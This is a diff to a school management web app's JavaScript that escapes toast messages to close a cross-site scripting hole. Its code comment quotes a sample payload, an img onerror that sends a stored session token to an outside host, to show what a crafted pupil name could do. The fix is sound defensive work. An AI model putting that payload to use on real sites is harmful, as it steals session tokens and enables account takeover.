@@ -213,6 +213,29 @@
   var TICK = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m20 6-11 11-5-5"/></svg>';
   var WARN = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 8v5M12 17h.01"/><circle cx="12" cy="12" r="9"/></svg>';
 
+  /** HTML-escape, for anything that reaches innerHTML. */
+  function escHtml(v) {
+    return String(v == null ? '' : v)
+      .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+  }
+
+  /**
+   * A message to the person using the app.
+   *
+   * The message is escaped. It used to go into innerHTML as-is, and the
+   * messages this app shows now carry data a school typed: pupil names,
+   * subject names, admission numbers, and every refusal the API writes — which
+   * quote them back. A pupil enrolled as
+   *
+   *     <img src=x onerror="fetch('https://elsewhere/'+localStorage['shule.jwt'])">
+   *
+   * would have run that in the bursar's browser the first time anything
+   * mentioned them, with the bursar's session to hand.
+   *
+   * opts.html is for the few callers that build their own markup, and they are
+   * responsible for escaping what they put in it.
+   */
   function toast(message, opts) {
     opts = opts || {};
     var host = doc.getElementById('toasts');
@@ -220,7 +243,8 @@
     var el = doc.createElement('div');
     el.className = 'toast' + (opts.tone === 'bad' ? ' toast--bad' : '');
     el.setAttribute('data-toast', '');
-    el.innerHTML = (opts.tone === 'bad' ? WARN : TICK) + '<span>' + message + '</span>';
+    var body = opts.html ? message : escHtml(message);
+    el.innerHTML = (opts.tone === 'bad' ? WARN : TICK) + '<span>' + body + '</span>';
     host.appendChild(el);
     global.setTimeout(function () { if (el.parentNode) el.parentNode.removeChild(el); }, opts.ms || 4200);
     return el;
@@ -375,6 +399,7 @@
     writeRole: writeRole,
     applyRole: applyRole,
     toast: toast,
+    esc: escHtml,
     showModal: showModal,
     closeModal: closeModal
   };
